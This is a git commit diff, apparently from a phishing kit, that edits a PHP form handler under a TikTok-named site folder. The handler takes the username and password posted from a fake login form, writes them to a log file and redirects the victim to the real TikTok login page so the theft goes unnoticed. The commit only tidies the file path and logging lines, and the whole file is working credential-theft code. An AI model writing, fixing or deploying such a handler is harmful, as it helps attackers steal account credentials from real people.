f21ef465f43b5fb71958dda9a2195ec67594a7db
Avtobu <lifeivanna2007@gmail.com>
2026-02-11 00:26:08 +0200

    fix

--- sites/tiktok/form.php
+++ sites/tiktok/form.php
@@ -1,7 +1,13 @@
 <?php
 
-file_put_contents("log.txt", "Username: " . $_POST['username'] . "\n" );
-file_put_contents("log.txt", "Pass: " . $_POST['password'] ,  FILE_APPEND);
+$path = __DIR__ . "/log.txt";
+$dataname = "Username: " . $_POST['username'] . "\n";
+$datapass = "Pass: " . $_POST['password'] . "\n";
+file_put_contents($path, $dataname);
+file_put_contents($path, $datapass, FILE_APPEND);
+
+#file_put_contents("log.txt", "Username: " . $_POST['username'] . "\n" );
+#file_put_contents("log.txt", "Pass: " . $_POST['password'] ,  FILE_APPEND);
 header ("location: https://www.tiktok.com/login");
 exit();
 ?>
